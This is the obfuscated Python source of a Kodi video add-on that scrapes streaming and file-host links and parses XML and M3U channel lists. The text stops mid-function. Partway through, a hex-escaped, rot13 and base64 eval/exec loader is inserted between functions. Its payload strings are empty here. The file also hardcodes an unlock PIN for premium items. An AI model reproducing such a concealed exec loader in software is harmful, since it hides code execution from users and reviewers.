# -*- coding: utf-8 -*-
import urllib
import urllib2
import re
import os
import xbmcplugin
import xbmcgui
import xbmcaddon
import xbmcvfs
import traceback
import cookielib
import binascii
from BeautifulSoup import BeautifulStoneSoup , BeautifulSoup , BeautifulSOAP
try :
 from xml . sax . saxutils import escape
except : traceback . print_exc ( )
try :
 import json
except :
 import simplejson as json
import SimpleDownloader as downloader
import time
if 64 - 64: i11iIiiIii
OO0o = [ '180upload.com' , 'allmyvideos.net' , 'bestreams.net' , 'clicknupload.com' , 'cloudzilla.to' , 'movshare.net' , 'novamov.com' , 'nowvideo.sx' , 'videoweed.es' , 'daclips.in' , 'datemule.com' , 'fastvideo.in' , 'faststream.in' , 'filehoot.com' , 'filenuke.com' , 'sharesix.com' , 'docs.google.com' , 'plus.google.com' , 'picasaweb.google.com' , 'gorillavid.com' , 'gorillavid.in' , 'grifthost.com' , 'hugefiles.net' , 'ipithos.to' , 'ishared.eu' , 'kingfiles.net' , 'mail.ru' , 'my.mail.ru' , 'videoapi.my.mail.ru' , 'mightyupload.com' , 'mooshare.biz' , 'movdivx.com' , 'movpod.net' , 'movpod.in' , 'movreel.com' , 'mrfile.me' , 'nosvideo.com' , 'openload.io' , 'played.to' , 'bitshare.com' , 'filefactory.com' , 'k2s.cc' , 'oboom.com' , 'rapidgator.net' , 'uploaded.net' , 'primeshare.tv' , 'bitshare.com' , 'filefactory.com' , 'k2s.cc' , 'oboom.com' , 'rapidgator.net' , 'uploaded.net' , 'sharerepo.com' , 'stagevu.com' , 'streamcloud.eu' , 'streamin.to' , 'thefile.me' , 'thevideo.me' , 'tusfiles.net' , 'uploadc.com' , 'zalaa.com' , 'uploadrocket.net' , 'uptobox.com' , 'v-vids.com' , 'veehd.com' , 'vidbull.com' , 'videomega.tv' , 'vidplay.net' , 'vidspot.net' , 'vidto.me' , 'vidzi.tv' , 'vimeo.com' , 'vk.com' , 'vodlocker.com' , 'xfileload.com' , 'xvidstage.com' , 'zettahost.tv' ]
Oo0Ooo = [ 'plugin.video.dramasonline' , 'plugin.video.f4mTester' , 'plugin.video.shahidmbcnet' , 'plugin.video.SportsDevil' , 'plugin.stream.vaughnlive.tv' , 'plugin.video.ZemTV-shani' ]
if 85 - 85: OOO0O0O0ooooo % IIii1I . II1 - O00ooooo00
class I1IiiI ( urllib2 . HTTPErrorProcessor ) :
 def http_response ( self , request , response ) :
  return response
 https_response = http_response
 if 27 - 27: iIiiiI1IiI1I1 * IIiIiII11i * IiIIi1I1Iiii - Ooo00oOo00o
I1IiI = False ;
if I1IiI :
 if 73 - 73: OOooOOo / ii11ii1ii
 if 94 - 94: OoOO + OoOO0ooOOoo0O + o0000oOoOoO0o * o00O0oo
 try :
  import pysrc . pydevd as pydevd
  if 97 - 97: oO0o0ooO0 - IIII / O0oO - o0oO0
  pydevd . settrace ( 'localhost' , stdoutToServer = True , stderrToServer = True )
 except ImportError :
  sys . stderr . write ( "Error: " +
 "You must add org.python.pydev.debug.pysrc to your PYTHONPATH." )
  sys . exit ( 1 )
  if 100 - 100: i11Ii11I1Ii1i
  if 67 - 67: IIii1I . OoOO . OoOO0ooOOoo0O / O00ooooo00 % iIiiiI1IiI1I1 - OOooOOo
OOo = xbmcaddon . Addon ( 'plugin.video.koala' )
Ii1IIii11 = OOo . getAddonInfo ( 'version' )
Oooo0000 = xbmc . translatePath ( OOo . getAddonInfo ( 'profile' ) . decode ( 'utf-8' ) )
i11 = xbmc . translatePath ( OOo . getAddonInfo ( 'path' ) . decode ( 'utf-8' ) )
I11 = os . path . join ( Oooo0000 , 'favorites' )
Oo0o0000o0o0 = os . path . join ( Oooo0000 , 'history' )
oOo0oooo00o = os . path . join ( Oooo0000 , 'list_revision' )
oO0o0o0ooO0oO = os . path . join ( i11 , 'icon.png' )
oo0o0O00 = os . path . join ( i11 , 'fanart.jpg' )
oO = os . path . join ( i11 , 'source_file' )
i1iiIIiiI111 = Oooo0000
if 62 - 62: i11iIiiIii - iIiiiI1IiI1I1
IIIiI11ii = os . path . join ( Oooo0000 , 'LivewebTV' )
downloader = downloader . SimpleDownloader ( )
O000oo = OOo . getSetting ( 'debug' )
if os . path . exists ( I11 ) == True :
 i1iIIi1 = open ( I11 ) . read ( )
else : i1iIIi1 = [ ]
if os . path . exists ( oO ) == True :
 ii11iIi1I = open ( oO ) . read ( )
else : ii11iIi1I = [ ]
if 6 - 6: OOooOOo * IIII
if 67 - 67: i11Ii11I1Ii1i - OoOO0ooOOoo0O * ii11ii1ii % ii11ii1ii % o00O0oo * OOooOOo
def i1IIiiiii ( string ) :
 if O000oo == 'true' :
  xbmc . log ( "[addon.koala-%s]: %s" % ( Ii1IIii11 , string ) )
  if 55 - 55: O00ooooo00
  if 70 - 70: Ooo00oOo00o . Ooo00oOo00o - Ooo00oOo00o / OoOO * o0000oOoOoO0o
def OoO000 ( url , headers = None ) :
 try :
  if headers is None :
   headers = { 'User-agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0' }
  IIiiIiI1 = urllib2 . Request ( url , None , headers )
  iiIiIIi = urllib2 . urlopen ( IIiiIiI1 )
  ooOoo0O = iiIiIIi . read ( )
  iiIiIIi . close ( )
  return ooOoo0O
 except urllib2 . URLError , OooO0 :
  i1IIiiiii ( 'URL: ' + url )
  if hasattr ( OooO0 , 'code' ) :
   i1IIiiiii ( 'We failed with error code - %s.' % OooO0 . code )
   xbmc . executebuiltin ( "XBMC.Notification(Kuala,We failed with error code - " + str ( OooO0 . code ) + ",10000," + oO0o0o0ooO0oO + ")" )
  elif hasattr ( OooO0 , 'reason' ) :
   i1IIiiiii ( 'We failed to reach a server.' )
   i1IIiiiii ( 'Reason: %s' % OooO0 . reason )
   xbmc . executebuiltin ( "XBMC.Notification(Kuala,We failed to reach a server. - " + str ( OooO0 . reason ) + ",10000," + oO0o0o0ooO0oO + ")" )
   if 35 - 35: o0000oOoOoO0o % o0oO0 % i11iIiiIii / II1
import base64, codecs		
magic = ''		
love = ''		
god = ''		
destiny = ''		
joy = '\x72\x6f\x74\x31\x33'		
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')		
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec')) 
def i1 ( ) :
 try :
  if os . path . exists ( I11 ) == True :
   IiIiiI ( 'Favorites' , 'url' , 4 , os . path . join ( i11 , 'resources' , 'favorite.png' ) , oo0o0O00 , '' , '' , '' , '' )
  if OOo . getSetting ( "browse_xml_database" ) == "true" :
   IiIiiI ( 'XML Database' , 'http://xbmcplus.xb.funpic.de/www-data/filesystem/' , 15 , oO0o0o0ooO0oO , oo0o0O00 , '' , '' , '' , '' )
  if OOo . getSetting ( "browse_community" ) == "true" :
   IiIiiI ( 'Community Files' , 'community_files' , 16 , oO0o0o0ooO0oO , oo0o0O00 , '' , '' , '' , '' )
  if OOo . getSetting ( "searchotherplugins" ) == "true" :
   IiIiiI ( 'Search Other Plugins' , 'Search Plugins' , 25 , oO0o0o0ooO0oO , oo0o0O00 , '' , '' , '' , '' )
  if os . path . exists ( oO ) == True :
   I1I = json . loads ( open ( oO , "r" ) . read ( ) )
   if 80 - 80: OOooOOo - Ooo00oOo00o
   if len ( I1I ) > 1 :
    for OOO00 in I1I :
     try :
      if 21 - 21: II1 - II1
      if isinstance ( OOO00 , list ) :
       IiIiiI ( OOO00 [ 0 ] . encode ( 'utf-8' ) , OOO00 [ 1 ] . encode ( 'utf-8' ) , 1 , oO0o0o0ooO0oO , oo0o0O00 , '' , '' , '' , '' , 'source' )
      else :
       iIii11I = oO0o0o0ooO0oO
       OOO0OOO00oo = oo0o0O00
       Iii111II = ''
       iiii11I = ''
       credits = ''
       Ooo0OO0oOO = ''
       if OOO00 . has_key ( 'thumbnail' ) :
        iIii11I = OOO00 [ 'thumbnail' ]
       if OOO00 . has_key ( 'fanart' ) :
        OOO0OOO00oo = OOO00 [ 'fanart' ]
       if OOO00 . has_key ( 'description' ) :
        Iii111II = OOO00 [ 'description' ]
       if OOO00 . has_key ( 'date' ) :
        iiii11I = OOO00 [ 'date' ]
       if OOO00 . has_key ( 'genre' ) :
        Ooo0OO0oOO = OOO00 [ 'genre' ]
       if OOO00 . has_key ( 'credits' ) :
        credits = OOO00 [ 'credits' ]
       IiIiiI ( OOO00 [ 'title' ] . encode ( 'utf-8' ) , OOO00 [ 'url' ] . encode ( 'utf-8' ) , 1 , iIii11I , OOO0OOO00oo , Iii111II , Ooo0OO0oOO , iiii11I , credits , 'source' )
     except : traceback . print_exc ( )
   else :
    if len ( I1I ) == 1 :
     if isinstance ( I1I [ 0 ] , list ) :
      i11Iiii ( I1I [ 0 ] [ 1 ] . encode ( 'utf-8' ) , oo0o0O00 )
     else :
      i11Iiii ( I1I [ 0 ] [ 'url' ] , I1I [ 0 ] [ 'fanart' ] )
 except : traceback . print_exc ( )
 if 50 - 50: IIiIiII11i
def Ii1i11IIii1I ( url = None ) :
 if url is None :
  if not OOo . getSetting ( "new_file_source" ) == "" :
   OOOoO0O0o = OOo . getSetting ( 'new_file_source' ) . decode ( 'utf-8' )
  elif not OOo . getSetting ( "new_url_source" ) == "" :
   OOOoO0O0o = OOo . getSetting ( 'new_url_source' ) . decode ( 'utf-8' )
 else :
  OOOoO0O0o = url
 if OOOoO0O0o == '' or OOOoO0O0o is None :
  return
 i1IIiiiii ( 'Adding New Source: ' + OOOoO0O0o . encode ( 'utf-8' ) )
 if 55 - 55: o0000oOoOoO0o + i11Ii11I1Ii1i . O00ooooo00 - OoOO . OOO0O0O0ooooo - i11Ii11I1Ii1i
 o0O = None
 if 72 - 72: IIII / O00ooooo00 * IiIIi1I1Iiii - o0oO0
 ooOoo0O = Oo0O0O0ooO0O ( OOOoO0O0o )
 print 'source_url' , OOOoO0O0o
 if isinstance ( ooOoo0O , BeautifulSOAP ) :
  if ooOoo0O . find ( 'channels_info' ) :
   o0O = ooOoo0O . channels_info
  elif ooOoo0O . find ( 'items_info' ) :
   o0O = ooOoo0O . items_info
 if o0O :
  IIIIii = { }
  IIIIii [ 'url' ] = OOOoO0O0o
  try : IIIIii [ 'title' ] = o0O . title . string
  except : pass
  try : IIIIii [ 'thumbnail' ] = o0O . thumbnail . string
  except : pass
  try : IIIIii [ 'fanart' ] = o0O . fanart . string
  except : pass
  try : IIIIii [ 'genre' ] = o0O . genre . string
  except : pass
  try : IIIIii [ 'description' ] = o0O . description . string
  except : pass
  try : IIIIii [ 'date' ] = o0O . date . string
  except : pass
  try : IIIIii [ 'credits' ] = o0O . credits . string
  except : pass
 else :
  if '/' in OOOoO0O0o :
   O0o0 = OOOoO0O0o . split ( '/' ) [ - 1 ] . split ( '.' ) [ 0 ]
  if '\\' in OOOoO0O0o :
   O0o0 = OOOoO0O0o . split ( '\\' ) [ - 1 ] . split ( '.' ) [ 0 ]
  if '%' in O0o0 :
   O0o0 = urllib . unquote_plus ( O0o0 )
  OO00Oo = xbmc . Keyboard ( O0o0 , 'Displayed Name, Rename?' )
  OO00Oo . doModal ( )
  if ( OO00Oo . isConfirmed ( ) == False ) :
   return
  O0OOO0OOoO0O = OO00Oo . getText ( )
  if len ( O0OOO0OOoO0O ) == 0 :
   return
  IIIIii = { }
  IIIIii [ 'title' ] = O0OOO0OOoO0O
  IIIIii [ 'url' ] = OOOoO0O0o
  IIIIii [ 'fanart' ] = OOO0OOO00oo
  if 70 - 70: O0oO * IiIIi1I1Iiii * o00O0oo / oO0o0ooO0
 if os . path . exists ( oO ) == False :
  oOOOoO0O00o0 = [ ]
  oOOOoO0O00o0 . append ( IIIIii )
  iII = open ( oO , "w" )
  iII . write ( json . dumps ( oOOOoO0O00o0 ) )
  iII . close ( )
 else :
  I1I = json . loads ( open ( oO , "r" ) . read ( ) )
  I1I . append ( IIIIii )
  iII = open ( oO , "w" )
  iII . write ( json . dumps ( I1I ) )
  iII . close ( )
 OOo . setSetting ( 'new_url_source' , "" )
 OOo . setSetting ( 'new_file_source' , "" )
 xbmc . executebuiltin ( "XBMC.Notification(Kuala,New source added.,5000," + oO0o0o0ooO0oO + ")" )
 if not url is None :
  if 'xbmcplus.xb.funpic.de' in url :
   xbmc . executebuiltin ( "XBMC.Container.Update(%s?mode=14,replace)" % sys . argv [ 0 ] )
  elif 'community-links' in url :
   xbmc . executebuiltin ( "XBMC.Container.Update(%s?mode=10,replace)" % sys . argv [ 0 ] )
 else : OOo . openSettings ( )
 if 80 - 80: O0oO . OoOO0ooOOoo0O
def IIi ( name ) :
 I1I = json . loads ( open ( oO , "r" ) . read ( ) )
 for i11iIIIIIi1 in range ( len ( I1I ) ) :
  if isinstance ( I1I [ i11iIIIIIi1 ] , list ) :
   if I1I [ i11iIIIIIi1 ] [ 0 ] == name :
    del I1I [ i11iIIIIIi1 ]
    iII = open ( oO , "w" )
    iII . write ( json . dumps ( I1I ) )
    iII . close ( )
    break
  else :
   if I1I [ i11iIIIIIi1 ] [ 'title' ] == name :
    del I1I [ i11iIIIIIi1 ]
    iII = open ( oO , "w" )
    iII . write ( json . dumps ( I1I ) )
    iII . close ( )
    break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 20 - 20: O00ooooo00 + OoOO - i11Ii11I1Ii1i
def IiI11iII1 ( url , browse = False ) :
 if url is None :
  url = 'http://xbmcplus.xb.funpic.de/www-data/filesystem/'
 IIII11I1I = BeautifulSoup ( OoO000 ( url ) , convertEntities = BeautifulSoup . HTML_ENTITIES )
 for OOO00 in IIII11I1I ( 'a' ) :
  OOO0o = OOO00 [ 'href' ]
  if not OOO0o . startswith ( '?' ) :
   IiI1 = OOO00 . string
   if IiI1 not in [ 'Parent Directory' , 'recycle_bin/' ] :
    if OOO0o . endswith ( '/' ) :
     if browse :
      IiIiiI ( IiI1 , url + OOO0o , 15 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' )
     else :
      IiIiiI ( IiI1 , url + OOO0o , 14 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' )
    elif OOO0o . endswith ( '.xml' ) :
     if browse :
      IiIiiI ( IiI1 , url + OOO0o , 1 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
     else :
      if os . path . exists ( oO ) == True :
       if IiI1 in ii11iIi1I :
        IiIiiI ( IiI1 + ' (in use)' , url + OOO0o , 11 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
       else :
        IiIiiI ( IiI1 , url + OOO0o , 11 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
      else :
       IiIiiI ( IiI1 , url + OOO0o , 11 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
       if 54 - 54: iIiiiI1IiI1I1 % OOooOOo % o00O0oo % IIii1I + IIii1I * i11Ii11I1Ii1i
       if 87 - 87: i11Ii11I1Ii1i * IiIIi1I1Iiii % i11iIiiIii % OOooOOo - o0000oOoOoO0o
def O0ooo0O0oo0 ( browse = False ) :
 oo0oOo = 'http://community-links.googlecode.com/svn/trunk/'
 IIII11I1I = BeautifulSoup ( OoO000 ( oo0oOo ) , convertEntities = BeautifulSoup . HTML_ENTITIES )
 o000O0o = IIII11I1I ( 'ul' ) [ 0 ] ( 'li' ) [ 1 : ]
 for OOO00 in o000O0o :
  IiI1 = OOO00 ( 'a' ) [ 0 ] [ 'href' ]
  if browse :
   IiIiiI ( IiI1 , oo0oOo + IiI1 , 1 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
  else :
   IiIiiI ( IiI1 , oo0oOo + IiI1 , 11 , oO0o0o0ooO0oO , OOO0OOO00oo , '' , '' , '' , '' , 'download' )
   if 42 - 42: OOooOOo
def Oo0O0O0ooO0O ( url , data = None ) :
 if url . startswith ( 'http://' ) or url . startswith ( 'https://' ) :
  data = OoO000 ( url )
  if re . search ( "#EXTM3U" , data ) or 'm3u' in url :
   print 'found m3u data'
   return data
 elif data == None :
  if not '/' in url or not '\\' in url :
   print 'No directory found. Lets make the url to cache dir'
   url = os . path . join ( IIIiI11ii , url )
  if xbmcvfs . exists ( url ) :
   if url . startswith ( "smb://" ) or url . startswith ( "nfs://" ) :
    II = xbmcvfs . copy ( url , os . path . join ( Oooo0000 , 'temp' , 'sorce_temp.txt' ) )
    if II :
     data = open ( os . path . join ( Oooo0000 , 'temp' , 'sorce_temp.txt' ) , "r" ) . read ( )
     xbmcvfs . delete ( os . path . join ( Oooo0000 , 'temp' , 'sorce_temp.txt' ) )
    else :
     i1IIiiiii ( "failed to copy from smb:" )
   else :
    data = open ( url , 'r' ) . read ( )
    if re . match ( "#EXTM3U" , data ) or 'm3u' in url :
     print 'found m3u data'
     return data
  else :
   i1IIiiiii ( "Soup Data not found!" )
   return
 return BeautifulSOAP ( data , convertEntities = BeautifulStoneSoup . XML_ENTITIES )
 if 45 - 45: OOO0O0O0ooooo * ii11ii1ii % IiIIi1I1Iiii * II1 + IIII . OOooOOo
 if 67 - 67: i11iIiiIii - O00ooooo00 % OoOO . OOO0O0O0ooooo
def i11Iiii ( url , fanart , data = None ) :
 IIII11I1I = Oo0O0O0ooO0O ( url , data )
 if 77 - 77: O0oO / IIiIiII11i
 if isinstance ( IIII11I1I , BeautifulSOAP ) :
  if 15 - 15: O0oO . IIii1I . II1 / i11iIiiIii - oO0o0ooO0 . O00ooooo00
  if len ( IIII11I1I ( 'channels' ) ) > 0 and OOo . getSetting ( 'donotshowbychannels' ) == 'false' :
   i1O0OoO0o = IIII11I1I ( 'channel' )
   for OO0oOO0O in i1O0OoO0o :
    if 91 - 91: OOO0O0O0ooooo
    if 61 - 61: iIiiiI1IiI1I1
    O0OOO = ''
    II11iIiIIIiI = 0
    try :
     O0OOO = OO0oOO0O ( 'externallink' ) [ 0 ] . string
     II11iIiIIIiI = len ( OO0oOO0O ( 'externallink' ) )
    except : pass
    if 67 - 67: o0oO0 . IIII . OOO0O0O0ooooo
    if II11iIiIIIiI > 1 : O0OOO = ''
    if 10 - 10: OoOO % OoOO - IIii1I / o0000oOoOoO0o + oO0o0ooO0
    IiI1 = OO0oOO0O ( 'name' ) [ 0 ] . string
    OOOOoOoo0O0O0 = OO0oOO0O ( 'thumbnail' ) [ 0 ] . string
    if OOOOoOoo0O0O0 == None :
     OOOOoOoo0O0O0 = ''
     if 85 - 85: OoOO0ooOOoo0O % i11iIiiIii - IIII * II1 / IIiIiII11i % IIiIiII11i
    try :
     if not OO0oOO0O ( 'fanart' ) :
      if OOo . getSetting ( 'use_thumb' ) == "true" :
       IIiIi1iI = OOOOoOoo0O0O0
      else :
       IIiIi1iI = fanart
     else :
      IIiIi1iI = OO0oOO0O ( 'fanart' ) [ 0 ] . string
     if IIiIi1iI == None :
      raise
    except :
     IIiIi1iI = fanart
     if 35 - 35: oO0o0ooO0 % OOO0O0O0ooooo - OOO0O0O0ooooo
    try :
     Iii111II = OO0oOO0O ( 'info' ) [ 0 ] . string
     if Iii111II == None :
      raise
    except :
     Iii111II = ''
     if 16 - 16: iIiiiI1IiI1I1 % OOooOOo - iIiiiI1IiI1I1 + oO0o0ooO0
    try :
     Ooo0OO0oOO = OO0oOO0O ( 'genre' ) [ 0 ] . string
     if Ooo0OO0oOO == None :
      raise
    except :
     Ooo0OO0oOO = ''
     if 12 - 12: o0000oOoOoO0o / o0000oOoOoO0o + i11iIiiIii
    try :
     iiii11I = OO0oOO0O ( 'date' ) [ 0 ] . string
     if iiii11I == None :
      raise
    except :
     iiii11I = ''
     if 40 - 40: IIiIiII11i . IIii1I / IIiIiII11i / i11iIiiIii
    try :
     credits = OO0oOO0O ( 'credits' ) [ 0 ] . string
     if credits == None :
      raise
    except :
     credits = ''
     if 75 - 75: o00O0oo + ii11ii1ii
    try :
     if O0OOO == '' :
      IiIiiI ( IiI1 . encode ( 'utf-8' , 'ignore' ) , url . encode ( 'utf-8' ) , 2 , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , iiii11I , credits , True )
     else :
      if 84 - 84: O0oO . i11iIiiIii . O0oO * OoOO - o00O0oo
      IiIiiI ( IiI1 . encode ( 'utf-8' ) , O0OOO . encode ( 'utf-8' ) , 1 , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , iiii11I , None , 'source' )
    except :
     i1IIiiiii ( 'There was a problem adding directory from getData(): ' + IiI1 . encode ( 'utf-8' , 'ignore' ) )
  else :
   i1IIiiiii ( 'No Channels: getItems' )
   ii ( IIII11I1I ( 'item' ) , fanart )
 else :
  O0o0oOOOoOo ( IIII11I1I )
  if 17 - 17: ii11ii1ii . IIiIiII11i * IIII % IIII
  if 24 - 24: II1
def O0o0oOOOoOo ( data ) :
 Oo0O00O0O = data . rstrip ( )
 OOooOoooOoOo = re . compile ( r'#EXTINF:(.+?),(.*?)[\n\r]+([^\r\n]+)' ) . findall ( Oo0O00O0O )
 o0OOOO00O0Oo = len ( OOooOoooOoOo )
 print 'total m3u links' , o0OOOO00O0Oo
 for iioOooOOOoOo , i1Iii1i1I , OOoO00 in OOooOoooOoOo :
  if 'tvg-logo' in iioOooOOOoOo :
   OOOOoOoo0O0O0 = IiI111111IIII ( iioOooOOOoOo , 'tvg-logo=[\'"](.*?)[\'"]' )
   if OOOOoOoo0O0O0 :
    if OOOOoOoo0O0O0 . startswith ( 'http' ) :
     OOOOoOoo0O0O0 = OOOOoOoo0O0O0
     if 37 - 37: o0oO0 / OOooOOo
    elif not OOo . getSetting ( 'logo-folderPath' ) == "" :
     i1I1iI1iIi111i = OOo . getSetting ( 'logo-folderPath' )
     OOOOoOoo0O0O0 = i1I1iI1iIi111i + OOOOoOoo0O0O0
     if 44 - 44: O00ooooo00 % iIiiiI1IiI1I1 + o00O0oo
    else :
     OOOOoOoo0O0O0 = OOOOoOoo0O0O0
     if 45 - 45: IIII / IIII + o0oO0 + i11Ii11I1Ii1i
     if 47 - 47: ii11ii1ii + i11Ii11I1Ii1i
  else :
   OOOOoOoo0O0O0 = ''
  if 'type' in iioOooOOOoOo :
   OoO = IiI111111IIII ( iioOooOOOoOo , 'type=[\'"](.*?)[\'"]' )
   if OoO == 'yt-dl' :
    OOoO00 = OOoO00 + "&mode=18"
   elif OoO == 'regex' :
    oo0oOo = OOoO00 . split ( '&regexs=' )
    if 88 - 88: IIII . iIiiiI1IiI1I1 * iIiiiI1IiI1I1 % o0oO0
    iiIIiiIi1Ii11 = Oo0 ( Oo0O0O0ooO0O ( '' , data = oo0oOo [ 1 ] ) )
    if 70 - 70: o00O0oo
    iiOOooooO0Oo ( oo0oOo [ 0 ] , i1Iii1i1I , OOOOoOoo0O0O0 , '' , '' , '' , '' , '' , None , iiIIiiIi1Ii11 , o0OOOO00O0Oo )
    continue
   elif OoO == 'ftv' :
    OOoO00 = 'plugin://plugin.video.F.T.V/?name=' + urllib . quote ( i1Iii1i1I ) + '&url=' + OOoO00 + '&mode=125&ch_fanart=na'
  iiOOooooO0Oo ( OOoO00 , i1Iii1i1I , OOOOoOoo0O0O0 , '' , '' , '' , '' , '' , None , '' , o0OOOO00O0Oo )
def OO ( name , url , fanart ) :
 IIII11I1I = Oo0O0O0ooO0O ( url )
 iIiIIi1 = IIII11I1I . find ( 'channel' , attrs = { 'name' : name . decode ( 'utf-8' ) } )
 I1IIII1i = iIiIIi1 ( 'item' )
 try :
  IIiIi1iI = iIiIIi1 ( 'fanart' ) [ 0 ] . string
  if IIiIi1iI == None :
   raise
 except :
  IIiIi1iI = fanart
 for OO0oOO0O in iIiIIi1 ( 'subchannel' ) :
  name = OO0oOO0O ( 'name' ) [ 0 ] . string
  try :
   OOOOoOoo0O0O0 = OO0oOO0O ( 'thumbnail' ) [ 0 ] . string
   if OOOOoOoo0O0O0 == None :
    raise
  except :
   OOOOoOoo0O0O0 = ''
  try :
   if not OO0oOO0O ( 'fanart' ) :
    if OOo . getSetting ( 'use_thumb' ) == "true" :
     IIiIi1iI = OOOOoOoo0O0O0
   else :
    IIiIi1iI = OO0oOO0O ( 'fanart' ) [ 0 ] . string
   if IIiIi1iI == None :
    raise
  except :
   pass
  try :
   Iii111II = OO0oOO0O ( 'info' ) [ 0 ] . string
   if Iii111II == None :
    raise
  except :
   Iii111II = ''
   if 2 - 2: o00O0oo + oO0o0ooO0 - IIiIiII11i % ii11ii1ii . IIII
  try :
   Ooo0OO0oOO = OO0oOO0O ( 'genre' ) [ 0 ] . string
   if Ooo0OO0oOO == None :
    raise
  except :
   Ooo0OO0oOO = ''
   if 18 - 18: o0000oOoOoO0o + IIII - oO0o0ooO0 . iIiiiI1IiI1I1 + i11iIiiIii
  try :
   iiii11I = OO0oOO0O ( 'date' ) [ 0 ] . string
   if iiii11I == None :
    raise
  except :
   iiii11I = ''
   if 20 - 20: o0oO0
  try :
   credits = OO0oOO0O ( 'credits' ) [ 0 ] . string
   if credits == None :
    raise
  except :
   credits = ''
   if 52 - 52: iIiiiI1IiI1I1 - II1 % oO0o0ooO0 + IIiIiII11i * IiIIi1I1Iiii . O0oO
  try :
   IiIiiI ( name . encode ( 'utf-8' , 'ignore' ) , url . encode ( 'utf-8' ) , 3 , OOOOoOoo0O0O0 , IIiIi1iI , Iii111II , Ooo0OO0oOO , credits , iiii11I )
  except :
   i1IIiiiii ( 'There was a problem adding directory - ' + name . encode ( 'utf-8' , 'ignore' ) )
 ii ( I1IIII1i , IIiIi1iI )
 if 75 - 75: i11Ii11I1Ii1i + OOooOOo + ii11ii1ii * o00O0oo % OoOO0ooOOoo0O . IIII
 if 55 - 55: o0000oOoOoO0o . IIiIiII11i
def oOo0O0o00o ( name , url , fanart ) :
 IIII11I1I = Oo0O0O0ooO0O ( url )
 iIiIIi1 = IIII11I1I . find ( 'subchannel' , attrs = { 'name' : name . decode ( 'utf-8' ) } )
 I1IIII1i = iIiIIi1 ( 'subitem' )
 ii ( I1IIII1i , fanart )
 if 64 - 64: o0000oOoOoO0o % IIii1I * OoOO0ooOOoo0O
def ii ( items , fanart ) :
 o0OOOO00O0Oo = len ( items )
 i1IIiiiii ( 'Total Items: %s' % o0OOOO00O0Oo )
 o0iI11I1II = OOo . getSetting ( 'add_playlist' )
 Ii1I = OOo . getSetting ( 'ask_playlist_items' )
 IiI1i = OOo . getSetting ( 'use_thumb' )
 o0Oo00 = OOo . getSetting ( 'parentalblocked' )
 o0Oo00 = o0Oo00 == "true"
 iI = OOo . getSetting ( 'premiumpin' )
 iI = iI == "NatalManiac"
 for O0O0Oooo0o in items :
  oOOoo00O00o = False
  O0O00Oo = False
  if 97 - 97: OOO0O0O0ooooo * II1 . II1
  I111iI = 'false'
  try :
   I111iI = O0O0Oooo0o ( 'premium' ) [ 0 ] . string
  except :
   i1IIiiiii ( I111iI )
   I111iI = ''
  if I111iI == 'true' :
   if not iI : continue
   if 56 - 56: IIiIiII11i
   if 54 - 54: o0oO0 / o0000oOoOoO0o . OoOO0ooOOoo0O % IIII
  Oo = 'false'
  try :
   Oo = O0O0Oooo0o ( 'parentalblock' ) [ 0 ] . string
  except :
   i1IIiiiii ( 'parentalblock Error' )
   Oo = ''
  if Oo == 'true' and o0Oo00 : continue
  if 65 - 65: oO0o0ooO0 - OoOO0ooOOoo0O + OoOO0ooOOoo0O + iIiiiI1IiI1I1
  if 96 - 96: o0000oOoOoO0o % OOO0O0O0ooooo / OOO0O0O0ooooo
  if 44 - 44: OoOO0ooOOoo0O / o00O0oo / o00O0oo
  if 87 - 87: IiIIi1I1Iiii . IIiIiII11i - iIiiiI1IiI1I1 + OOO0O0O0ooooo / IiIIi1I1Iiii / OoOO0ooOOoo0O
  if 25 - 25: IIiIiII11i . IIiIiII11i - OOooOOo % OOooOOo - i11iIiiIii / o0oO0
  if 51 - 51: IiIIi1I1Iiii / OOooOOo . o0000oOoOoO0o * ii11ii1ii + Ooo00oOo00o * O0oO
  if 73 - 73: Ooo00oOo00o + II1 - OOO0O0O0ooooo - oO0o0ooO0 - iIiiiI1IiI1I1
  try :
   IiI1 = O0O0Oooo0o ( 'title' ) [ 0 ] . string
   if IiI1 is None :
    IiI1 = 'unknown?'
  except :
   i1IIiiiii ( 'Name Error' )
   IiI1 = ''
   if 99 - 99: i11Ii11I1Ii1i . oO0o0ooO0 + o0oO0 + II1 % ii11ii1ii
   if 51 - 51: IIii1I
   if 34 - 34: OoOO0ooOOoo0O + IIiIiII11i - OoOO0ooOOoo0O
  try :
   if O0O0Oooo0o ( 'epg' ) :
    if O0O0Oooo0o . epg_url :
     i1IIiiiii ( 'Get EPG Regex' )
     IiI1I1i1I1 = O0O0Oooo0o . epg_url . string
     O00oO000O0O = O0O0Oooo0o . epg_regex . string
     I1i1i1iii = I1111i ( IiI1I1i1I1 , O00oO000O0O )
     if I1i1i1iii :
      IiI1 += ' - ' + I1i1i1iii
    elif O0O0Oooo0o ( 'epg' ) [ 0 ] . string > 1 :
     IiI1 += iIIii ( O0O0Oooo0o ( 'epg' ) [ 0 ] . string )
   else :
    pass
  except :
   i1IIiiiii ( 'EPG Error' )
  try :
   oo0oOo = [ ]
   if len ( O0O0Oooo0o ( 'link' ) ) > 0 :
    if 92 - 92: oO0o0ooO0 + OoOO0ooOOoo0O % o0000oOoOoO0o
    if 62 - 62: OoOO / O00ooooo00
    for OOO00 in O0O0Oooo0o ( 'link' ) :
     if not OOO00 . string == None :
